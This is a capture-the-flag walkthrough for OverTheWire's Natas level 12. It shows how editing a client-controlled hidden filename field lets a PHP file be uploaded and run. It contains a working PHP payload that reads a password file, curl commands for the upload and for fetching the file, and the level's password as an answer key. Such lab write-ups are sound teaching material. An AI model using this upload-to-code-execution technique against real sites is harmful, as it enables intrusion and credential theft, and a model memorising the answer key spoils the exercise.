# Natas Level 12 → 13

## Goal

The page lets you upload a JPEG. The server renames the uploaded file to `<random>.jpg`, but the extension comes from a **hidden form field** in the HTML — which you can edit before submitting. Change it to `.php`, upload a PHP payload, then browse to the resulting URL to get code execution.

## Concepts you'll learn

- Why **client-controlled** extension determination is a file-upload anti-pattern
- Using Burp Suite, `curl`, or dev tools to tamper with a form before submission
- Writing a tiny PHP payload that reads the password file

## Walkthrough

### 1. Look at the form

```html
<input type="hidden" name="filename" value="abc123.jpg">
<input type="file" name="uploadedfile">
<input type="submit" value="Upload File">
```

The server uses the `filename` value — which lives in your browser — as the final name. Edit it to anything ending in `.php`.

### 2. Write a payload

Save as `shell.php` on your machine:

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

### 3. Upload with the edited filename

Option A (Burp Suite): intercept the upload request, change the `filename` field to `shell.php`, forward.

Option B (curl):

```bash
$ curl -u natas12:<pass> \
       -F "filename=shell.php" \
       -F "uploadedfile=@shell.php" \
       http://natas12.natas.labs.overthewire.org/index.php
```

The response includes the URL of the uploaded file, e.g. `upload/abc123.php`.

### 4. Fetch the uploaded file

```bash
$ curl -u natas12:<pass> http://natas12.natas.labs.overthewire.org/upload/abc123.php
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## The answer

The password for `natas13` is:

**`jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas12.natas.labs.overthewire.org/>
